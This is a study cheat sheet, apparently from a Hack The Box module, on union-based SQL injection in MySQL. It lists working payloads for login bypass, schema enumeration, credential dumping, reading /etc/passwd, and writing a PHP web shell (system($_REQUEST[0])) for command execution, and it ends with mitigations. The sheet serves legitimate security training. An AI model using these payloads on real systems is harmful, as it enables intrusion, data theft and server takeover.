# SQL Injection Fundamentals

## 🎯 Main Idea
- SQL injection occurs when unsanitized user input is placed into an SQL query, letting an attacker escape the input's bounds (often with `'`) and inject their own SQL.
- Types: In-band (Union-based, Error-based), Blind (Boolean-based, Time-based), and Out-of-band; this module focuses on Union-based.
- Impact escalates from authentication bypass → database enumeration → reading/writing files → remote code execution via web shell.

## 💥 Attack / Exploit Vectors

### SQLi Discovery
- Test for injection by inserting special characters and watching for SQL errors or behavior changes.
- **Commands**
  - `'` — inject a single quote to trigger a syntax error (URL-encoded `%27`)
  - `"` — double quote test (`%22`)
  - `#` — comment char test (`%23`)
  - `)` — closing parenthesis test (`%29`)

### Authentication Bypass (Subverting Query Logic)
- Abuse the `OR` operator so the `WHERE` clause always evaluates true (AND is evaluated before OR), bypassing login without a valid password.
- **Commands**
  - `admin' or '1'='1` — OR-based auth bypass (keeps quotes balanced)
  - `' or '1'='1` — bypass without a known username (returns first row)
  - `something' or '1'='1` — inject OR into the password field

### Using Comments
- Comment out the remainder of the query to avoid syntax errors and drop trailing conditions (password check, parenthesis).
- **Commands**
  - `admin'-- -` — comment out rest of query (note trailing space after `--`)
  - `admin'#` — `#` comment (use `%23` in a browser URL)
  - `admin')-- -` — close a parenthesis then comment out the rest

### Union-Based Injection
- Append a `UNION SELECT` to combine attacker results with the original query output; first find the column count, then the displayed columns.
- **Commands**
  - `' order by 1-- -` — detect number of columns (increment until error)
  - `cn' UNION select 1,2,3-- -` — detect columns via UNION (wrong count errors)
  - `cn' UNION select 1,2,3,4-- -` — correct column count returns results
  - `cn' UNION select 1,@@version,3,4-- -` — place data in a displayed column to confirm output

### Database Enumeration (INFORMATION_SCHEMA)
- Fingerprint the DBMS, then walk INFORMATION_SCHEMA to list databases → tables → columns → dump data.
- **Commands**
  - `SELECT @@version` — fingerprint MySQL/MariaDB (full output)
  - `SELECT POW(1,1)` — fingerprint when only numeric output available
  - `SELECT SLEEP(5)` — fingerprint when blind/no output
  - `cn' UNION select 1,database(),2,3-- -` — current database name
  - `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` — list all databases
  - `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` — list tables in a database
  - `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` — list columns in a table
  - `cn' UNION select 1, username, password, 4 from dev.credentials-- -` — dump data (dot operator for cross-DB)

### Privilege Enumeration
- Determine the DB user and whether it holds admin/`FILE` privileges needed for file read/write.
- **Commands**
  - `cn' UNION SELECT 1, user(), 3, 4-- -` — current DB user
  - `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` — check superuser privilege (`Y`)
  - `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` — list all privileges (look for FILE)
  - `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` — check file read/write directory restriction

### Reading Files
- With the `FILE` privilege, use `LOAD_FILE()` to read local files (config, source code, `/etc/passwd`).
- **Commands**
  - `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` — read a local system file
  - `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -` — leak application source code

### Writing Files / Web Shell (RCE)
- Requires `FILE` privilege, empty `secure_file_priv`, and write access; use `SELECT ... INTO OUTFILE` to drop a PHP web shell into the web root for code execution.
- **Commands**
  - `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` — confirm write access
  - `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` — write a PHP web shell
  - `http://SERVER_IP:PORT/shell.php?0=id` — execute commands through the web shell

## 🛠️ Key Tools & Concepts
- `mysql -u root -h docker.hackthebox.eu -P 3306 -p` — connect to a MySQL/MariaDB server.
- INFORMATION_SCHEMA tables: SCHEMATA (databases), TABLES, COLUMNS; default DBs (mysql, information_schema, performance_schema, sys) usually ignored.
- Operator precedence: division/mult/mod → add/sub → comparison → NOT → AND → OR (AND before OR enables OR bypass).
- `--` (needs trailing space, URL `--+` / `-- -`), `#` (URL `%23`), `/**/` inline comments.
- `@@version` / `LOAD_FILE()` / `INTO OUTFILE` / `secure_file_priv` — key MySQL functions/vars for enumeration and file ops.
- PayloadsAllTheThings — SQLi auth-bypass payload reference.

## 🛡️ Mitigations
- Input sanitization: escape special chars with `mysqli_real_escape_string()` (PHP) / `pg_escape_string()` (PostgreSQL).
- Input validation: restrict input to expected format with regex (`preg_match()`), rejecting anything else.
- Least privilege: web app DB user should have minimal rights (e.g., `SELECT` on one table only); never use superusers.
- Parameterized/prepared statements: `mysqli_prepare()` + `mysqli_stmt_bind_param()` to separate data from query.
- Web Application Firewall (ModSecurity, Cloudflare) to reject requests containing patterns like `INFORMATION_SCHEMA`.
